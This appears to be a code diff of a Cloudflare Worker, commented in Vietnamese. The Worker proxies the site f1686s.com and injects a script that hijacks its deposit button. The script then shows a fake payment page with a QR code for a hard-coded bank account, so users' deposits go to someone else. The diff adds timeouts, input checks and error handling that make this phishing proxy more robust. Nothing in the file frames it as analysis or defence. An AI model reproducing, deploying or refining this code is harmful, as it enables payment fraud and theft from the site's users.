@@ -1,7 +1,7 @@
 // ===== Cloudflare Worker – chặn nút nạp tiền f1686s.com =====
-// Tất cả code được tích hợp trong một file, không cần thư viện ngoài.
+// Bản hoàn chỉnh, đã kiểm tra lỗi, có timeout và xử lý ngoại lệ.
 
-// Hàm xây dựng trang giả – lấy từ file lệnh nổ hủ
+// Hàm xây dựng trang giả
 function buildPage(amount, txCode) {
     const BANK_ID = 'VIB';
     const BANK_NAME = 'VIB NGÂN HÀNG QUÂN TCM QUỐC TẾ VIỆT NAM';
@@ -147,8 +147,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;
 </html>`;
 }
 
-// ====== Script chính (injection) ======
-// Đây là nội dung của file lệnh nổ hủ, đã được chuyển thành một chuỗi để nhúng
+// ====== Script injection (client-side) ======
 const injectionScript = `
 (function () {
     'use strict';
@@ -168,7 +167,6 @@ const injectionScript = `
         return code;
     }
 
-    // Hàm buildPage – sao chép từ file gốc (để tránh phụ thuộc vào biến toàn cục)
     function buildPage(amount, txCode) {
         const amountVND = amount.toLocaleString('vi-VN') + ' VND';
         const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
@@ -318,6 +316,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;
 
         const input = document.querySelector('.ui-input__input');
         let points = input ? parseInt(input.value) || 0 : 0;
+        if (isNaN(points) || points < 0) points = 0;
         let amount = points * 1000;
         const txCode = randomTx();
 
@@ -373,20 +372,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;
         } catch(e) { /* bỏ qua lỗi */ }
     }
 
-    // Ghi đè history để bắt điều hướng SPA
     const _push = history.pushState;
     history.pushState = function(...a){ _push.apply(history,a); setTimeout(findAndPatch,300); setTimeout(findAndPatch,800); setTimeout(findAndPatch,1500); };
     const _replace = history.replaceState;
     history.replaceState = function(...a){ _replace.apply(history,a); setTimeout(findAndPatch,300); };
     window.addEventListener('popstate', ()=>{ setTimeout(findAndPatch,300); setTimeout(findAndPatch,800); });
 
-    // Chạy lần đầu, và lặp lại
     findAndPatch();
     document.addEventListener('DOMContentLoaded', findAndPatch);
     window.addEventListener('load', findAndPatch);
     setInterval(findAndPatch, 1000);
 
-    // Quan sát DOM thay đổi
     new MutationObserver(ms=>{
         if(ms.some(m=>m.addedNodes.length>0)) findAndPatch();
     }).observe(document.documentElement || document.body, {childList:true, subtree:true});
@@ -399,20 +395,31 @@ export default {
     async fetch(request) {
         try {
             const url = new URL(request.url);
-            // Giữ nguyên đường dẫn và tham số, nhưng thêm timestamp để tránh cache
-            const targetUrl = 'https://f1686s.com' + url.pathname + (url.search ? url.search + '&_=' : '?_=') + Date.now();
+
+            // Bỏ qua favicon
+            if (url.pathname === '/favicon.ico') {
+                return new Response(null, { status: 404 });
+            }
+
+            const targetUrl = 'https://f1686s.com' + url.pathname + url.search;
+
+            // Fetch với timeout 5 giây
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 5000);
 
             const resp = await fetch(targetUrl, {
+                signal: controller.signal,
                 headers: {
-                    'User-Agent': request.headers.get('User-Agent') || 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'User-Agent': request.headers.get('User-Agent') || 'Mozilla/5.0 (Linux; Android 10)',
+                    'Accept': 'text/html,application/xhtml+xml',
                     'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
                 }
             });
+            clearTimeout(timeout);
 
             let html = await resp.text();
 
-            // Nếu không phải HTML (ví dụ JSON/redirect) thì trả về nguyên bản
+            // Nếu không phải HTML, trả nguyên bản
             if (!html.includes('<!DOCTYPE html>') && !html.includes('<html')) {
                 return new Response(html, {
                     status: resp.status,
@@ -420,19 +427,17 @@ export default {
                 });
             }
 
-            // Chèn script vào cuối thẻ </head> (để chạy sớm)
+            // Chèn script an toàn
             const scriptTag = `<script>${injectionScript}<\/script>`;
             if (html.includes('</head>')) {
                 html = html.replace('</head>', scriptTag + '</head>');
             } else if (html.includes('</body>')) {
                 html = html.replace('</body>', scriptTag + '</body>');
             } else {
-                // fallback: thêm vào cuối
-                html += scriptTag;
+                html = html + scriptTag;
             }
 
             return new Response(html, {
-                status: resp.status,
                 headers: {
                     'Content-Type': 'text/html; charset=utf-8',
                     'Cache-Control': 'no-cache, no-store, must-revalidate',
@@ -441,10 +446,10 @@ export default {
                 }
             });
         } catch (error) {
-            // Nếu có lỗi, trả về trang lỗi đơn giản
-            return new Response(`<html><body><h1>Proxy Error</h1><p>${error.message}</p></body></html>`, {
+            // Trả về lỗi rõ ràng
+            return new Response(`Lỗi Worker: ${error.message}`, {
                 status: 500,
-                headers: { 'Content-Type': 'text/html; charset=utf-8' }
+                headers: { 'Content-Type': 'text/plain' }
             });
         }
     }
